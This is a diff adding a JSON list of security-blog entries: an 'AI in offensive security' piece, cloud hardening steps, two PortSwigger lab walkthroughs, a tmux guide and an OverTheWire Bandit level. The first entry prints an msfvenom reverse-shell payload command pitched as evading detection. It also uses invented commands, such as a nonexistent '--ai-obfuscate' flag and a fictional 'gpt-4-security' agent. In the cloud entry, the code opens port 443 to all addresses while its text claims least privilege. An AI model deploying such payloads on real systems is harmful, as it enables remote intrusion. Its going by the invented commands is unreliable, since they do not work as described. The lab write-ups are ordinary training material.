@@ -1,0 +1,190 @@
+[
+  {
+    "id": 1,
+    "slug": "The-Future-of-AI-in-Offensive-Security",
+    "title": "The Future of AI in Offensive Security",
+    "date": "March 2026",
+    "summary": "Exploring how LLMs and autonomous agents are reshaping the landscape of penetration testing and vulnerability discovery.",
+    "videoUrl": "https://www.youtube.com/watch?v=37Omb6e64To",
+    "mainImage": "/intelligence/The-Future-of-AI-in-Offensive-Security/main.jpg",
+    "tags": [
+      "AI",
+      "Offensive Security",
+      "Research"
+    ],
+    "steps": [
+      {
+        "title": "Reconnaissance with Autonomous Agents",
+        "description": "The first phase involves deploying a specialized LLM agent to map the target infrastructure. Unlike traditional scanners, these agents can understand context and identify non-obvious entry points.",
+        "code": "python3 ai_recon.py --target 10.10.11.200 --depth 3 --llm gpt-4-security",
+        "images": [
+          "/intelligence/The-Future-of-AI-in-Offensive-Security/1.png"
+        ]
+      },
+      {
+        "title": "Vulnerability Synthesis",
+        "description": "Once the reconnaissance data is ingested, the AI synthesizes potential attack vectors by cross-referencing CVE databases with the specific configuration identified.",
+        "code": "curl -X POST http://ai-engine:8080/analyze -d @recon_report.json",
+        "images": [
+          "/intelligence/The-Future-of-AI-in-Offensive-Security/2.png"
+        ]
+      },
+      {
+        "title": "Payload Generation & Execution",
+        "description": "The final step is the generation of a context-aware payload designed to exploit the synthesized vulnerability while remaining undetected by static analysis tools.",
+        "code": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf --ai-obfuscate",
+        "images": [
+          "/intelligence/The-Future-of-AI-in-Offensive-Security/collage-2.jpg"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "slug": "Securing-Cloud-Infrastructures-at-Scale",
+    "title": "Securing Cloud Infrastructures at Scale",
+    "date": "February 2026",
+    "summary": "Tactical guidelines for maintaining a fortress-level security posture in complex multi-cloud environments.",
+    "videoUrl": "https://www.youtube.com/watch?v=37Omb6e64To",
+    "mainImage": "/intelligence/Securing-Cloud-Infrastructures-at-Scale/main.jpg",
+    "tags": [
+      "Cloud",
+      "Infrastructure",
+      "DevSecOps"
+    ],
+    "steps": [
+      {
+        "title": "Identity and Access Management Audit",
+        "description": "Initial audit of IAM roles and permissions to identify over-privileged accounts and potential privilege escalation paths.",
+        "code": "prowler aws --services iam --severity high",
+        "images": [
+          "/intelligence/Securing-Cloud-Infrastructures-at-Scale/3.png"
+        ]
+      },
+      {
+        "title": "Network Perimeter Hardening",
+        "description": "Implementing strict security groups and NACLs to enforce the principle of least privilege at the network layer.",
+        "code": "aws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol tcp --port 443 --cidr 0.0.0.0/0",
+        "images": [
+          "/intelligence/Securing-Cloud-Infrastructures-at-Scale/high.PNG"
+        ]
+      },
+      {
+        "title": "Automated Compliance Monitoring",
+        "description": "Deploying automated scripts to continuously monitor the infrastructure for compliance with industry standards like CIS and SOC2.",
+        "code": "terraform plan -out=compliance_check.tfplan",
+        "images": [
+          "/intelligence/Securing-Cloud-Infrastructures-at-Scale/step3.jpg"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "slug": "PortSwigger-Information-Disclosure-in-Error-Messages",
+    "title": "PortSwigger: Information Disclosure in Error Messages",
+    "date": "November 2025",
+    "summary": "Trigger a verbose error by sending text where the app expects a product ID, then read the framework version it leaks.",
+    "videoUrl": "https://www.youtube.com/watch?v=CNRLggTUKrs",
+    "mainImage": "/intelligence/PortSwigger-Information-Disclosure-in-Error-Messages/main.jpg",
+    "tags": [
+      "PortSwigger",
+      "Web Security",
+      "Information Disclosure"
+    ],
+    "steps": [
+      {
+        "title": "Steps to solve",
+        "description": "1. Open any product.\n2. In the URL, change the product ID from a number to text, then read the error message.\n3. Copy the framework version number shown in the error.\n4. Go back to / and submit it as the solution."
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "slug": "PortSwigger-Information-Disclosure-on-Debug-Page",
+    "title": "PortSwigger: Information Disclosure on Debug Page",
+    "date": "November 2025",
+    "summary": "Find a leftover phpinfo debug page with Burp Suite's content discovery and read the SECRET_KEY environment variable.",
+    "videoUrl": "https://www.youtube.com/watch?v=__Gyoog4NTw",
+    "mainImage": "/intelligence/PortSwigger-Information-Disclosure-on-Debug-Page/main.jpg",
+    "tags": [
+      "PortSwigger",
+      "Web Security",
+      "Information Disclosure",
+      "Burp Suite"
+    ],
+    "steps": [
+      {
+        "title": "Steps to solve",
+        "description": "1. Right-click the home page (/) → Engagement tools → Discover content, then click \"Session is not running\" to start the scan.\n2. Go to Target → Site map.\n3. Select the lab URL → cgi-bin → phpinfo.php.\n4. Right-click the request to phpinfo.php and copy its URL.\n5. Open a new tab and paste it.\n6. Press Ctrl+F and search for SECRET_KEY.\n7. Copy the value of the SECRET_KEY variable and submit it as the solution."
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "slug": "Tmux-Sessions-Keep-Programs-Running-After-You-Close-the-Terminal",
+    "title": "Tmux Sessions: Keep Programs Running After You Close the Terminal",
+    "date": "November 2025",
+    "summary": "Install tmux, detach from a running program, and come back to it later, even after closing your SSH session.",
+    "mainImage": "",
+    "tags": [
+      "Linux",
+      "Tmux",
+      "How-To"
+    ],
+    "steps": [
+      {
+        "title": "Install tmux",
+        "description": "I used Ubuntu (Debian based) to install this.",
+        "code": "sudo apt update\nsudo apt install tmux -y"
+      },
+      {
+        "title": "Start a single tmux session",
+        "description": "If you only need one session: start tmux and run your program. Detach with Ctrl + b, release both keys, then press d. You can now exit and log out.\nAfter connecting to the system again, attach to the session you detached from.",
+        "code": "tmux\npython3 oneway.py\n# Ctrl + b, release both keys, then d (detach)\nexit\nssh root@ip          # connect to the system again\ntmux attach          # attach to the most recently detached session"
+      },
+      {
+        "title": "Check tmux sessions and connect",
+        "description": "List the existing sessions. Sessions without names are numbered 0, 1, 2 and so on.\nAttach to the most recent session, or to a specific one (session 2 here).",
+        "code": "tmux ls\ntmux attach          # most recently detached session\ntmux attach -t 2     # session 2"
+      },
+      {
+        "title": "Create and run multiple tmux sessions",
+        "description": "Named sessions keep programs organized and easy to find. Create a session called MyFirstSession, run your program, detach, and attach again by name.\nCreate as many named sessions as you need.",
+        "code": "tmux new -s MyFirstSession\npython3 oneway.py\n# Ctrl + b, release both keys, then d (detach)\ntmux attach -t MyFirstSession"
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "slug": "OverTheWire-Bandit-Level-0-to-1",
+    "title": "OverTheWire Bandit: Level 0 → 1",
+    "date": "September 2025",
+    "summary": "Log in to the Bandit wargame over SSH for the first time and read the password for the next level from the readme file.",
+    "videoUrl": "https://www.youtube.com/watch?v=-HwLALmQdqg",
+    "mainImage": "/intelligence/OverTheWire-Bandit-Level-0-to-1/main.jpg",
+    "tags": [
+      "OverTheWire",
+      "Bandit",
+      "Linux",
+      "SSH"
+    ],
+    "steps": [
+      {
+        "title": "SSH to bandit0",
+        "description": "Username: bandit0\nPassword: bandit0\nHost: bandit.labs.overthewire.org\nPort: 2220",
+        "code": "ssh bandit0@bandit.labs.overthewire.org -p 2220"
+      },
+      {
+        "title": "Cat the readme file",
+        "description": "List the files in bandit0's home directory, then print the readme. It holds the password for bandit1.",
+        "code": "ls\ncat readme"
+      },
+      {
+        "title": "Bonus: copy remote files to Kali",
+        "description": "You can copy the remote (Bandit) files to your own system (Kali). Open a new terminal in Kali and copy bandit0's readme file to your Desktop. When asked for a password, give bandit0's password.\nThen go to the Desktop and cat the file.",
+        "code": "scp -P 2220 bandit0@bandit.labs.overthewire.org:~/readme ~/Desktop/\ncd ~/Desktop/\ncat readme"
+      }
+    ]
+  }
+]
